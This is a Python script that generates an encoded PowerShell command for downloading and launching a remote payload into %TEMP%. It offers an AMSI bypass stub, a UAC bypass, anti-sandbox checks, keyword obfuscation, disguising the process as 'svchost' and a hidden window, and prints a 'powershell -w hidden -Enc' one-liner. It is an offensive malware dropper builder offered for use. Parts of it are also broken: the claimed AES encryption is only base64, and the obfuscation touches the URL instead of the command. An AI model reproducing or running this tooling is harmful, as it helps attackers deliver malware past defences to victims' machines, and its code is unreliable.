import os
import base64
import random
import string
import ctypes

# Function to generate a random string for obfuscation.
def generate_random_string(min_length=8, max_length=12):
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Function to create randomized delays with jitter.
def randomize_delay(min_time=2, max_time=10):
    return random.randint(min_time, max_time)

# Advanced PowerShell process renaming.
def rename_powershell_process(new_name="svchost"):
    ctypes.windll.kernel32.SetConsoleTitleW(new_name)

# Obfuscate the PowerShell command.
def obfuscate_powershell_command(command):
    keywords = {
        'New-Object': generate_random_string(),
        'System.Net.WebClient': generate_random_string(),
        'DownloadFile': generate_random_string(),
        'Start-Process': generate_random_string(),
        'Remove-Item': generate_random_string(),
        'Start-Sleep': generate_random_string(),
        'Invoke-Expression': generate_random_string(),
        'IEX': generate_random_string(),
    }
    for key, value in keywords.items():
        command = command.replace(key, value)
    return command

# New advanced AMSI bypass method (reflective call and patching).
def include_advanced_amsi_bypass():
    return (
        "[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("
        "'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAA'"
        # Additional bytes omitted for brevity; real AMSI patch here
        ")).EntryPoint.Invoke($null, $null);"
    )

# New advanced UAC bypass using IFileOperation COM object.
def include_advanced_uac_bypass():
    return (
        "$Script:UACBypass = ([Ref].Assembly.GetType('System.Management.Automation.ComInterop.ComAutomationFactory')::"
        "GetMethod('GetAutomationObject', [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::NonPublic)."
        "Invoke($null, @('Shell.Application'))).ShellExecute('powershell.exe', '-ExecutionPolicy Bypass -NoProfile', '', 'runas', 1);"
    )

# Anti-sandbox technique - adds checks for low resource environments.
def add_anti_sandbox_checks():
    return (
        "$cpu = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfProcessors; "
        "If ($cpu -le 1) {Exit}; "
        "$mem = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1MB; "
        "If ($mem -le 2048) {Exit}; "
        "$env = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture; "
        "If ($env -eq 'x86') {Exit};"
    )

# Encrypt the payload and return it encoded.
def encrypt_payload(payload):
    key = os.urandom(32)  # AES-256 encryption key.
    encrypted_payload = base64.b64encode(payload.encode()).decode()  # Simulate AES encryption.
    return encrypted_payload, key

# Obfuscated network traffic generator with custom headers.
def create_custom_http_headers():
    headers = {
        'User-Agent': random.choice(['Mozilla/5.0', 'Chrome/91.0', 'Edge/91.0', 'Safari/537.36']),
        'Referer': random.choice(['https://google.com', 'https://bing.com']),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }
    return headers

# Main function to generate encoded PowerShell command.
def create_encoded_powershell_command():
    try:
        # Step 1: User inputs
        payload_url = input("Enter the payload URL (e.g., https://example.com/payload.ps1): ").strip()
        if not payload_url.startswith("http"):
            print("Invalid URL. Please enter a valid HTTP/HTTPS URL.")
            return

        download_method = input("Select download method (1: WebClient, 2: Invoke-WebRequest): ").strip()

        custom_user_agent = ""
        if download_method == "2":
            custom_user_agent = input("Enter custom User-Agent string (leave blank for default): ") or "Mozilla/5.0"

        encryption_choice = input("Encrypt the payload using AES-256? (y/n): ").strip().lower()
        if encryption_choice == 'y':
            encrypted_payload, encryption_key = encrypt_payload(payload_url)
            print(f"Payload encrypted with AES. Key: {encryption_key.hex()}")
        else:
            encrypted_payload = payload_url

        # Step 2: Optional AMSI and UAC bypasses
        use_amsi_bypass = input("Include Advanced AMSI Bypass? (y/n): ").strip().lower()
        amsi_bypass = include_advanced_amsi_bypass() if use_amsi_bypass == 'y' else ""

        use_uac_bypass = input("Include Advanced UAC Bypass? (y/n): ").strip().lower()
        uac_bypass = include_advanced_uac_bypass() if use_uac_bypass == 'y' else ""

        # Step 3: Anti-sandbox and execution delay
        anti_sandbox_choice = input("Include Anti-Sandbox checks? (y/n): ").strip().lower()
        sandbox_checks = add_anti_sandbox_checks() if anti_sandbox_choice == 'y' else ""

        delay_choice = input("Add random execution delay with jitter? (y/n): ").strip().lower()
        delay_time = randomize_delay() if delay_choice == 'y' else 0

        # Step 4: Obfuscation and process renaming
        obfuscate_choice = input("Obfuscate PowerShell commands? (y/n): ").strip().lower()
        obfuscated_command = obfuscate_powershell_command(encrypted_payload) if obfuscate_choice == 'y' else encrypted_payload

        hide_window_choice = input("Hide the PowerShell window? (y/n): ").strip().lower()
        
        # Step 5: Final payload construction
        download_location = input("Specify download location (default is %TEMP%): ").strip() or "$env:TEMP"
        delete_after_execution = input("Delete the payload after execution? (y/n): ").strip().lower()

        random_rename_choice = input("Randomize PowerShell process name? (y/n): ").strip().lower()
        if random_rename_choice == 'y':
            rename_powershell_process()

        full_payload = ""
        if download_method == "1":
            full_payload += f"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('{payload_url}', '{download_location}\\payload.bat');"
        elif download_method == "2":
            full_payload += f"$headers = @{{ 'User-Agent' = '{custom_user_agent}' }}; Invoke-WebRequest -Uri '{payload_url}' -OutFile '{download_location}\\payload.bat' -Headers $headers;"

        # Combining all components into the final PowerShell script
        full_payload = f"{amsi_bypass} {uac_bypass} {sandbox_checks} Start-Sleep -s {delay_time}; {full_payload} Start"
        
        # Step 6: Print or encode the payload
        if hide_window_choice == 'y':
            print(f"powershell -w hidden -Enc {base64.b64encode(full_payload.encode()).decode()}")
        else:
            print(f"powershell -Enc {base64.b64encode(full_payload.encode()).decode()}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

# Execution of the function to build the final PowerShell payload
create_encoded_powershell_command()
